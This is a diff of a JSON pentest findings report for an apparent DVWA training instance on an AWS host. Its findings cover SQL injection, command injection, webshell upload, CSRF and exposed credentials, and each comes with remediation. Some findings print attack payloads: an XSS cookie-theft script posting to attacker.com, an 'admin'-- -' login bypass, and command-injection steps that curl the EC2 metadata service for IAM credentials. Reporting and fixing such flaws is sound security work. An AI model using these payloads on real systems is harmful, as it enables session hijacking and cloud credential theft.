@@ -1,7 +1,23 @@
 {
   "findings": [
     {
-      "id": "fedf8a7a-ef3c-4123-81cc-a544082981c3",
+      "id": "311b4dc6-8fd9-47cc-8580-10e830fa04f4",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "CRITICAL",
+      "category": "WSTG-CONF-03",
+      "title": "Database Credentials Exposed via Backup Config File (config.inc.php.bak)",
+      "description": "The file /config/config.inc.php.bak is publicly accessible via HTTP and contains the full PHP source code of the application's database configuration, including plaintext database credentials. The file reveals: database server (127.0.0.1), database name (dvwa), database username (app), and database password (vulnerables). The file is served as application/x-trash (a backup extension) rather than being blocked or restricted. This allows any unauthenticated attacker to retrieve the database credentials and potentially access the database directly (port 3306 is currently filtered but this could change) or use these credentials for further attacks.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/config.inc.php.bak",
+      "remediation_summary": "1. Immediately delete the backup file /config/config.inc.php.bak from the web server. 2. Rotate the exposed database credentials (change password for the 'app' database user). 3. Configure Apache to deny access to .bak, .old, .tmp, .swp and other backup file extensions using a Deny directive or FilesMatch rule in httpd.conf or .htaccess. 4. Move configuration files containing credentials outside the web root. 5. Implement a pre-deployment checklist that removes all backup/temp files before going live.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "479d1b04-6b20-4904-b777-9b462b6a4fe4",
       "source": "prowler",
       "phase": 2,
       "severity": "CRITICAL",
@@ -52,7 +68,7 @@
       "is_validated": true
     },
     {
-      "id": "405b23da-09d9-4a31-a7d4-5ab28b51ce4a",
+      "id": "7b3680f8-fcd5-4dab-a198-a70c4b3b2f2f",
       "source": "prowler",
       "phase": 2,
       "severity": "CRITICAL",
@@ -107,23 +123,119 @@
       "is_validated": true
     },
     {
-      "id": "b641fdb8-a3d1-4dbc-876b-9cce36831bdb",
+      "id": "66499219-478a-4dc8-b2e3-16981dcfd5f0",
       "source": "autopentest",
       "phase": 3,
       "severity": "CRITICAL",
-      "category": "WSTG-CONF-03",
-      "title": "Database Credentials Exposed via Backup Config File (config.inc.php.bak)",
-      "description": "The file /config/config.inc.php.bak is publicly accessible via HTTP and contains the full PHP source code of the application's database configuration, including plaintext database credentials. The file reveals: database server (127.0.0.1), database name (dvwa), database username (app), and database password (vulnerables). The file is served as application/x-trash (a backup extension) rather than being blocked or restricted. This allows any unauthenticated attacker to retrieve the database credentials and potentially access the database directly (port 3306 is currently filtered but this could change) or use these credentials for further attacks.",
+      "category": "WSTG-INPV-05",
+      "title": "SQL Injection \u2014 UNION-Based Data Extraction in /vulnerabilities/sqli/ (id parameter)",
+      "description": "The `id` parameter in GET /vulnerabilities/sqli/ is vulnerable to UNION-based SQL injection. The parameter is interpolated directly into a SQL query without sanitisation. An attacker can inject a UNION SELECT clause to exfiltrate arbitrary data from any table in the database. Full credential dump of the `users` table was achieved, including usernames and MD5-hashed passwords for all 5 application accounts. Database fingerprinting revealed MariaDB 10.1.26 running the `dvwa` schema.\n\nConfirmed injection points and results:\n- `@@version` \u2192 10.1.26-MariaDB-0+deb9u1\n- `database()` \u2192 dvwa\n- `SELECT user,password FROM users` \u2192 5 accounts (admin, gordonb, 1337, pablo, smithy) with MD5 hashes",
       "resource_type": "url",
-      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/config.inc.php.bak",
-      "remediation_summary": "1. Immediately delete the backup file /config/config.inc.php.bak from the web server. 2. Rotate the exposed database credentials (change password for the 'app' database user). 3. Configure Apache to deny access to .bak, .old, .tmp, .swp and other backup file extensions using a Deny directive or FilesMatch rule in httpd.conf or .htaccess. 4. Move configuration files containing credentials outside the web root. 5. Implement a pre-deployment checklist that removes all backup/temp files before going live.",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/",
+      "remediation_summary": "1. Use parameterised queries (prepared statements) for all database interactions \u2014 never interpolate user input into SQL strings. 2. Apply least-privilege database accounts \u2014 the web app account should not be able to SELECT from arbitrary tables. 3. Hash passwords with bcrypt/Argon2 (the MD5 hashes are trivially crackable). 4. Implement a WAF as a defence-in-depth layer.",
       "remediation_cli": null,
       "compliance_mappings": null,
       "confidence": 1.0,
       "is_validated": false
     },
     {
-      "id": "21f16374-1eb3-4c63-a621-a609420963fe",
+      "id": "8deb45b5-ee0c-49bd-b114-ff0d9da96327",
+      "source": "autopentest",
+      "phase": 3,
+      "severity": "CRITICAL",
+      "category": "WSTG-INPV-05",
+      "title": "SQL Injection \u2014 Boolean Blind Data Extraction in /vulnerabilities/sqli_blind/ (id parameter)",
+      "description": "The `id` parameter in GET /vulnerabilities/sqli_blind/ is vulnerable to boolean-based blind SQL injection. The application returns a binary oracle (\"User ID exists\" vs \"User ID is MISSING\") based on the truth of injected conditions, enabling bit-by-bit extraction of any database value. Exploitation confirmed database name as `dvwa` (length=4, first char='d') using substring() inference. A full automated exploitation with sqlmap/custom tooling would yield identical data to the error-based endpoint.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/sqli_blind/",
+      "remediation_summary": "1. Use parameterised queries (prepared statements) \u2014 same root cause as FINDING-035. 2. The boolean oracle response difference should be eliminated (return the same error for all invalid input). 3. Implement query result caching or timing normalisation to prevent time-based variants.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "80abc11b-a266-43f5-aafc-066e16bdd055",
+      "source": "autopentest",
+      "phase": 3,
+      "severity": "CRITICAL",
+      "category": "WSTG-INPV-12",
+      "title": "OS Command Injection \u2014 Arbitrary Command Execution via ip parameter in /vulnerabilities/exec/",
+      "description": "The `ip` POST parameter in /vulnerabilities/exec/ is passed unsanitised to a shell command (likely `ping`). An attacker can append arbitrary OS commands using standard shell separators (`;`, `|`, `&&`). Exploitation confirmed execution as `www-data` (uid=33) on a Linux x86_64 host running Amazon Linux 2023. Arbitrary file read was demonstrated by exfiltrating /etc/passwd. The server is a Docker container (hostname `1360b4239a47`) on an EC2 instance. This represents full OS-level Remote Code Execution.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/exec/",
+      "remediation_summary": "1. NEVER pass user input to shell functions (exec, shell_exec, system, passthru, popen). 2. Use language-native libraries for network operations (e.g., PHP's socket functions or ICMP libraries instead of calling `ping`). 3. If shell execution is unavoidable, use escapeshellarg() to sanitise input AND whitelist valid IP address patterns via regex before passing to the shell. 4. Apply OS-level restrictions: run the web process as a low-privilege user (already www-data) in a read-only filesystem with restricted system call access (seccomp/AppArmor).",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "7861ba02-757d-4e3a-8524-8a04e78aab6b",
+      "source": "autopentest",
+      "phase": 3,
+      "severity": "CRITICAL",
+      "category": "WSTG-INPV-01",
+      "title": "Vulnerability Chain: XSS + Missing HttpOnly Cookie = Authenticated Session Hijacking",
+      "description": "Three confirmed XSS vulnerabilities (FINDING-030 reflected, FINDING-031 stored, FINDING-032 DOM) chain with the missing HttpOnly flag on the PHPSESSID session cookie (FINDING-004) to enable complete authenticated session hijacking. Because PHPSESSID lacks the HttpOnly attribute, JavaScript executed via any of the three XSS vectors can access document.cookie and exfiltrate the session token.\n\nChain: XSS (reflected/stored/DOM) \u2192 document.cookie accessible \u2192 PHPSESSID stolen \u2192 session replayed by attacker \u2192 full account takeover.\n\nExploitation steps:\n1. An attacker induces a victim to click a reflected XSS link or visit a page that loads the stored payload.\n2. The payload executes: <script>document.location='http://attacker.com/?c='+document.cookie</script>\n3. The attacker receives the victim's PHPSESSID in their server log.\n4. The attacker replays the cookie in a browser and is authenticated as the victim.\n\nThis chain has been demonstrated: the cookie theft payload <script>document.write(document.cookie)</script> was confirmed to reflect the PHPSESSID value in the response (FINDING-030 evidence). The PHPSESSID is readable by JavaScript because HttpOnly is absent (FINDING-004).\n\nSeverity upgraded from High to Critical because the combination enables complete authentication bypass with no further prerequisites. Individual XSS severities are High; chaining with missing HttpOnly makes session hijacking trivially achievable.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/xss_r/",
+      "remediation_summary": "1. Set HttpOnly flag on PHPSESSID: session.cookie_httponly = 1 in php.ini (blocks JS access)\n2. Sanitize all user-supplied input before HTML output (fixes XSS root cause)\n3. Implement Content-Security-Policy to restrict script execution\n4. These three remediations must be applied together; fixing only one leaves the chain partially exploitable.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "93a6fcc6-5182-4e1f-8bff-dc59e0b0086e",
+      "source": "autopentest",
+      "phase": 3,
+      "severity": "CRITICAL",
+      "category": "WSTG-INPV-12",
+      "title": "Vulnerability Chain: OS Command Injection \u2192 AWS IMDSv1 Credential Theft",
+      "description": "The confirmed OS Command Injection vulnerability at /vulnerabilities/exec/ (FINDING-037, running as www-data) chains with the AWS EC2 IMDSv1 instance metadata service (FINDING-011) to enable AWS credential theft. Since IMDSv1 does not require a session token and is accessible from within the EC2 instance, the www-data process can make HTTP requests to the link-local metadata endpoint (169.254.169.254) and retrieve IAM role credentials.\n\nChain: RCE as www-data \u2192 curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ \u2192 retrieve IAM role name \u2192 curl http://169.254.169.254/.../RoleName \u2192 extract AccessKeyId, SecretAccessKey, Token \u2192 AWS API access.\n\nExploitation steps:\n1. Execute: ip=127.0.0.1;curl+http://169.254.169.254/latest/meta-data/iam/security-credentials/\n2. This returns the IAM role name attached to the instance.\n3. Execute: ip=127.0.0.1;curl+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\n4. Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token).\n5. Attacker uses credentials to access S3 buckets, EC2 APIs, and other AWS services.\n\nNote: The testing tool container could not reach 169.254.169.254 (link-local, external only), but the EC2 instance itself can. The www-data user obtained via CMDi runs within the EC2 instance and DOES have access to the metadata endpoint.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/exec/",
+      "remediation_summary": "1. Fix the OS Command Injection vulnerability (sanitize ip parameter input, use parameterized system calls)\n2. Enable IMDSv2 on the EC2 instance (requires session token, prevents SSRF-based IMDS access)\n3. Restrict the IAM role attached to this instance to minimum required permissions\n4. These remediations must be applied together; the RCE is the primary vector requiring immediate remediation.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "5bf2e407-2fb9-4ece-9038-98a01de1b089",
+      "source": "autopentest",
+      "phase": 3,
+      "severity": "CRITICAL",
+      "category": "WSTG-BUSL-08",
+      "title": "Unrestricted File Upload - PHP Webshell Upload and Remote Code Execution",
+      "description": "The file upload functionality at /vulnerabilities/upload/ does not validate the uploaded file type, extension, or content. A PHP webshell was successfully uploaded and executed, achieving Remote Code Execution (RCE) on the server as the www-data user running on a Linux 6.18.20 (Amazon Linux 2023) kernel. This is a separate exploitation vector from the OS command injection finding (FINDING-037) as it uses the file upload mechanism rather than the exec vulnerability. The application accepts PHP files regardless of the MIME type or extension, allows them to be stored in a web-accessible directory (/hackable/uploads/), and the web server executes them as PHP code. Note: allow_url_include is Off, so PHP remote file inclusion via the LFI endpoint is not possible - however RCE via file upload is fully confirmed. System info from shell execution: Linux hostname running kernel 6.18.20-20.229.amzn2023.x86_64 (Amazon Linux 2023).",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/upload/",
+      "remediation_summary": "1. Implement strict server-side file type validation using file content inspection (magic bytes), not just MIME type or extension. 2. Generate a random filename for uploaded files and store the mapping server-side. 3. Store uploaded files outside the web root or in a directory with PHP execution disabled (php_flag engine off in .htaccess). 4. Implement a whitelist of allowed file types (e.g., only .jpg, .png, .gif). 5. Validate file content matches the declared MIME type. 6. Remove execute permissions from the uploads directory.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "2b986d17-71a7-4675-9b53-98c737fc3be4",
+      "source": "autopentest",
+      "phase": 3,
+      "severity": "CRITICAL",
+      "category": "WSTG-INPV-05",
+      "title": "SQL Injection Authentication Bypass at /vulnerabilities/brute/ Login Form",
+      "description": "The brute-force challenge module at /vulnerabilities/brute/ is vulnerable to SQL injection in the `username` GET parameter, enabling complete authentication bypass without knowing any valid password. By injecting a SQL comment sequence, the password-checking clause is eliminated from the underlying query.\n\nUnderlying query (inferred): SELECT * FROM users WHERE username='$username' AND password=md5('$password')\n\nInjection: username = `admin'-- -` \u2192 query becomes: SELECT * FROM users WHERE username='admin'-- -'... (password check commented out)\n\nThe server returns \"Welcome to the password protected area admin'-- -\" and loads the admin's profile image (/hackable/users/admin.jpg), confirming successful authentication as admin with an incorrect password.\n\nThis is distinct from the SQLi data extraction vulnerability at /vulnerabilities/sqli/ (FINDING-035). This finding demonstrates that SQL injection in authentication contexts enables complete account takeover without needing the password \u2014 the most severe class of SQL injection impact.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/brute/",
+      "remediation_summary": "1. Use parameterized queries / prepared statements for all authentication queries (eliminates SQL injection)\n2. Apply input validation to reject special characters in usernames\n3. Hash passwords server-side before SQL comparison (already partially implemented but bypassed by injection)\n4. Implement account lockout after failed attempts to slow brute-force and injection testing",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "c88a128e-c5b3-4fdf-93a0-f9152082d846",
       "source": "autopentest",
       "phase": 1,
       "severity": "HIGH",
@@ -139,7 +251,7 @@
       "is_validated": false
     },
     {
-      "id": "daa932eb-aad8-481f-9264-6fa574ad9e81",
+      "id": "d0b5c2fa-f2a2-4b9f-9a95-5b5427407add",
       "source": "autopentest",
       "phase": 1,
       "severity": "HIGH",
@@ -155,7 +267,135 @@
       "is_validated": false
     },
     {
-      "id": "47f9f00c-90a0-40ea-a21b-c35a45669d48",
+      "id": "a3eebc83-3009-47e6-a02e-78c7a8aac94d",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "HIGH",
+      "category": "WSTG-CONF-04",
+      "title": "Application Configuration File Publicly Accessible (/config/config.inc.php)",
+      "description": "The file /config/config.inc.php is publicly accessible over HTTP without authentication (HTTP 200). The file contains repeated AWS credential placeholder comments (# aws_access_key_id = AKIA&lt;YOUR_KEY_ID_HERE&gt; / # aws_secret_access_key = &lt;YOUR_SECRET_HERE&gt;) and an EOFaws heredoc terminator, indicating this file is the designated location for real AWS credentials in deployment. While the current deployment uses placeholders, the file is entirely unprotected by Apache access controls, meaning any real credentials placed here would be immediately exfiltrated. Additionally, .gitignore (HTTP 200) is publicly accessible and reveals internal path structure. Cross-referenced with WSTG-CONF-04 and WSTG-CONF-09 (consolidated finding \u2014 same root cause and URL).",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/config.inc.php",
+      "remediation_summary": "1. Deny HTTP access to /config/ directory via Apache .htaccess or server config: Deny from all. 2. Remove /config/config.inc.php from the web root entirely \u2014 config files should not be in the document root. 3. Remove .gitignore from the web root. 4. Audit all files in the document root for inadvertent information disclosure. 5. Ensure real AWS credentials are never placed in web-accessible files; use IAM instance roles or AWS Secrets Manager instead.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "dd22cca1-704b-47e3-81b0-c1b8cac95c68",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "HIGH",
+      "category": "WSTG-ATHZ-02",
+      "title": "Unauthenticated Access to Administrative Setup Page (setup.php)",
+      "description": "The DVWA setup page (setup.php) is accessible without authentication. This page exposes sensitive server configuration details including: PHP version (7.0.30-0+deb9u1), database backend (MySQL), database name (dvwa), database host (127.0.0.1), database username (app), operating system (*nix), and web server hostname. The page also reveals whether URL inclusion is enabled and provides a \"Create / Reset Database\" button that would allow an unauthenticated attacker to reset the entire application database including admin credentials. The authorization check that protects all other DVWA pages does not apply to setup.php. Additionally, about.php and instructions.php are accessible without authentication, though these expose lower-risk information.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/setup.php",
+      "remediation_summary": "Enforce authentication checks on setup.php consistent with all other authenticated pages. Move setup functionality behind admin-level access controls. Consider removing or disabling setup.php entirely in production deployments. The page should check for a valid authenticated session before rendering any content or accepting POST requests.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "56dfde7c-9283-4648-ba70-30e8580c6822",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "HIGH",
+      "category": "WSTG-ATHZ-03",
+      "title": "Security Level Bypass via Client-Controlled Cookie (security=low)",
+      "description": "DVWA's security level (low/medium/high/impossible) is stored in a client-controlled cookie named \"security\" rather than server-side session state. Any authenticated user can freely modify this cookie value to change the application's security posture without server-side validation. This means:\n1. An admin who sets security=high (intending to restrict exploitation) can have their setting overridden by any authenticated user simply setting security=low in their browser.\n2. The security cookie is trusted entirely client-side \u2014 the server applies whichever level the client presents.\n\nProof: With the same valid session (PHPSESSID), changing the security cookie from \"low\" to \"high\" changes which SQL injection code path executes. Setting it back to \"low\" immediately re-enables the vulnerable code path, confirming the server applies no independent server-side security level per session.\n\nThis means all security hardening intended by the administrator can be trivially bypassed by any authenticated user, rendering the \"high\" and \"impossible\" security levels ineffective as access controls.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/security.php",
+      "remediation_summary": "Store the security level in server-side session state rather than a client-controlled cookie. The security level should be set once by an administrator and stored in the PHP session ($_SESSION['security']), not read from $_COOKIE['security'] on each request. Users should not be able to influence their own security level.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "dfd0e072-a4d5-42dc-a7ae-851b8f521f16",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "HIGH",
+      "category": "WSTG-SESS-03",
+      "title": "Session Fixation - PHPSESSID Not Rotated After Authentication",
+      "description": "DVWA does not issue a new session identifier upon successful user authentication. The PHPSESSID assigned before login remains unchanged after the user authenticates, enabling session fixation attacks. An attacker who can fix a victim's session token (e.g., via a URL parameter if trans_sid were enabled, or via subdomain cookie injection) would be able to hijack the authenticated session without knowing the victim's credentials.\n\nEvidence: Pre-login PHPSESSID `0hd80hcaic4514t1kcbm1q32f2` remained identical post-login (cookie jar comparison). The server issued a 302 redirect to index.php on successful login but did NOT issue a new Set-Cookie: PHPSESSID header, confirming the session ID was reused.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/login.php",
+      "remediation_summary": "Call session_regenerate_id(true) immediately after successful authentication in login.php. The 'true' parameter deletes the old session file. Example: if (valid_credentials) { session_regenerate_id(true); $_SESSION['user'] = $username; }",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "b0fb0876-2dee-4cbf-b10a-16a5660b4c41",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "HIGH",
+      "category": "WSTG-ATHN-02",
+      "title": "Multiple Default/Weak Credentials Active on All DVWA User Accounts",
+      "description": "All five DVWA user accounts use well-known default or trivially weak passwords that are publicly documented. All credentials were verified as valid: gordonb/abc123, 1337/charley, pablo/letmein, smithy/password (admin password also confirmed working). These credentials are the factory defaults for DVWA and are known to any attacker familiar with the platform. The admin account username is \"Admin\" (capital A) while the login form is case-sensitive.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/login.php",
+      "remediation_summary": "Change all default passwords to strong, unique passwords. Implement a password policy enforcing minimum length (12+ chars), complexity, and preventing use of well-known default passwords. Disable or remove demo/test accounts not needed in production.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "c27636e8-6a3a-437b-97c7-a62178847195",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "HIGH",
+      "category": "WSTG-SESS-05",
+      "title": "Cross-Site Request Forgery (CSRF) on Password Change Endpoint",
+      "description": "The password change functionality at /vulnerabilities/csrf/ accepts GET requests with no CSRF token validation. An authenticated user can have their password changed by visiting a malicious link or loading a page containing a crafted URL. No CSRF token, Referer check, or any anti-forgery mechanism is present. Additionally, the form does not require the current/old password before accepting a new one, making account takeover trivial \u2014 an attacker with a valid session (e.g., via session hijacking or XSS) can change the password without knowing the original. Password change was confirmed successful via direct unauthenticated GET request with only session cookie. This vulnerability was also confirmed under WSTG-ATHN-09.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csrf/",
+      "remediation_summary": "1. Switch the form method from GET to POST to prevent URL-based attacks. 2. Implement synchronizer token pattern: generate a per-session CSRF token, embed it in the form as a hidden field, validate it server-side on every state-changing request. 3. Consider adding SameSite=Strict to session cookies to block cross-site requests. 4. Require the current password to be entered when changing the password (defense-in-depth).",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "54083e51-209a-4f5d-8e68-94bd90e4dbbe",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "HIGH",
+      "category": "WSTG-ATHN-09",
+      "title": "Password Change Function Has No CSRF Protection and No Current Password Verification",
+      "description": "The password change functionality at /vulnerabilities/csrf/ uses the HTTP GET method and requires no CSRF token. An authenticated user's password can be changed by any webpage they visit while logged in \u2014 a classic CSRF attack. Additionally, the form does not require the user's current password to be entered before setting a new one, making account takeover trivial once CSRF is exploited. The change was confirmed successful via direct GET request with only the new password parameters.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/csrf/",
+      "remediation_summary": "1. Change password change functionality to use POST method. 2. Implement a synchronizer CSRF token on the form. 3. Require the user's current password before accepting a new password. 4. Implement SameSite=Strict or SameSite=Lax on session cookies. Note: This is an intentional vulnerability in DVWA for training purposes.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "f66e6a98-0306-4c22-af43-3921a9a87408",
+      "source": "autopentest",
+      "phase": 1,
+      "severity": "HIGH",
+      "category": "WSTG-CONF-04",
+      "title": "Backup Configuration File Exposes Database Credentials",
+      "description": "The file /config/config.inc.php.bak is publicly accessible without authentication and contains plaintext database credentials: db_user='app', db_password='vulnerables', db_database='dvwa', db_server='127.0.0.1'. The /config/ directory also has Apache directory listing enabled, revealing all files in the directory including config.inc.php, config.inc.php.bak, and config.inc.php.dist.",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/config.inc.php.bak",
+      "remediation_summary": "1. Remove or restrict access to backup configuration files (.bak, .dist). 2. Disable Apache directory listing (Options -Indexes). 3. Move config directory outside web root or protect with .htaccess. 4. Rotate the exposed database credentials immediately.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "6a7c1eb6-3e7f-4665-9e85-980fc1032508",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -208,7 +448,7 @@
       "is_validated": true
     },
     {
-      "id": "23274020-56d5-4afd-a40a-45162d8f224e",
+      "id": "6ff33f77-c74d-4094-b9f6-f0dbb2fde279",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -261,7 +501,7 @@
       "is_validated": true
     },
     {
-      "id": "fc4b83e5-4951-4387-a399-da6fa3d51afb",
+      "id": "a4a35e5b-1c85-4c0c-a68d-181897baab81",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -314,7 +554,7 @@
       "is_validated": true
     },
     {
-      "id": "5149c346-d261-43f8-8226-520687c4304b",
+      "id": "536f339e-4f86-405b-95b9-612010648cf4",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -367,7 +607,7 @@
       "is_validated": true
     },
     {
-      "id": "e38ac997-0bd9-495c-84ac-0ea7e7fab042",
+      "id": "a70a3b21-aed3-4a46-906c-8fb488fd3ea1",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -420,7 +660,7 @@
       "is_validated": true
     },
     {
-      "id": "508bbcdd-e15e-4c85-9b54-8d556c399faf",
+      "id": "2b724518-0def-4bea-976b-5e6293045de5",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -473,7 +713,7 @@
       "is_validated": true
     },
     {
-      "id": "6b5048f1-7eeb-45bf-ab41-01a18d4afea9",
+      "id": "ade765a9-06cd-4b5f-86ea-eb59e9b8350d",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -526,7 +766,7 @@
       "is_validated": true
     },
     {
-      "id": "bd796082-092e-40c1-a94f-ab842e828905",
+      "id": "9703cc34-b59f-4f5d-9468-5d3fb4d1cc09",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -579,7 +819,7 @@
       "is_validated": true
     },
     {
-      "id": "866c3cd5-a551-4431-bc08-dbcdbc23d4f4",
+      "id": "90b2d176-fd2f-4ccd-bfdd-8830a2e6faee",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -632,7 +872,7 @@
       "is_validated": true
     },
     {
-      "id": "2fa40755-756d-4136-89dd-19c812a8e5ed",
+      "id": "c2d8492b-7a82-4923-a91b-f0c687a0cedc",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -685,7 +925,7 @@
       "is_validated": true
     },
     {
-      "id": "534c1c5c-1fac-40a4-a7e9-e8f3bb38293a",
+      "id": "d2724a3a-5ecc-4324-b93f-b35c71997555",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -738,7 +978,7 @@
       "is_validated": true
     },
     {
-      "id": "14ae436b-5116-46c0-b348-19714bf5ffd6",
+      "id": "a900990a-7cfd-404a-8011-30e999549650",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -791,7 +1031,7 @@
       "is_validated": true
     },
     {
-      "id": "831d5353-3126-4981-abe1-1f2b7ad23df7",
+      "id": "8b75bd4d-03d0-427d-8611-cc82feb9e778",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -844,7 +1084,7 @@
       "is_validated": true
     },
     {
-      "id": "e100afc3-f2da-41d7-8f30-5dfc61313ca9",
+      "id": "a1850f3d-63f0-4619-973f-7287398242ce",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -897,7 +1137,7 @@
       "is_validated": true
     },
     {
-      "id": "689928da-4c3f-4534-b293-e60d71a881e0",
+      "id": "8e4ef18b-b0cd-4405-adef-bc623832b0d0",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -950,7 +1190,7 @@
       "is_validated": true
     },
     {
-      "id": "c50d1852-08e3-4686-8efa-7f5d7c4816ac",
+      "id": "84444442-c862-40cc-ad7d-d271d67ecdc4",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1003,7 +1243,7 @@
       "is_validated": true
     },
     {
-      "id": "78339867-380c-4603-98c4-a0298d5d179d",
+      "id": "ae54b168-af5b-4dad-a57f-86830bd1e360",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1056,7 +1296,7 @@
       "is_validated": true
     },
     {
-      "id": "a5bbd525-9c5d-4623-bbe9-93b7fd88cea5",
+      "id": "36bf8ff6-2da5-4438-a403-d84f96621de2",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1108,7 +1348,7 @@
       "is_validated": true
     },
     {
-      "id": "b97431b8-c47c-409d-9ecc-e111eb2d4f7d",
+      "id": "bdb95eda-744a-4022-bb56-662ada534e70",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1160,7 +1400,7 @@
       "is_validated": true
     },
     {
-      "id": "1d3cf5ad-e84c-46d9-b744-667819b04291",
+      "id": "7e673960-ccae-4d9e-970c-e13ed88fd761",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1184,7 +1424,7 @@
       "is_validated": true
     },
     {
-      "id": "e8764b99-b174-4e47-adcb-b22e89b64c6f",
+      "id": "90fb6e5d-c515-440a-931e-84361c770a2b",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1226,7 +1466,7 @@
       "is_validated": true
     },
     {
-      "id": "bcbdd822-d9e9-4677-a1e0-4eebf3b908f6",
+      "id": "ca20dcb6-6f39-4b21-be56-ec9b6b686b2c",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1268,7 +1508,7 @@
       "is_validated": true
     },
     {
-      "id": "9fca28cc-f6ea-4438-a877-b3752490071d",
+      "id": "cbb7fb2b-d791-4906-a4ba-d2352516fd5b",
       "source": "prowler",
       "phase": 2,
       "severity": "HIGH",
@@ -1315,7 +1555,7 @@
       "is_validated": true
     },
     {
-      "id": "4660356a-1f37-462b-ae68-80f175bbcaee",
+      "id": "5fd6eacf-04f0-4eca-9bc8-bd30f87ae34a",
       "source": "prowler",
       "phase": 2,
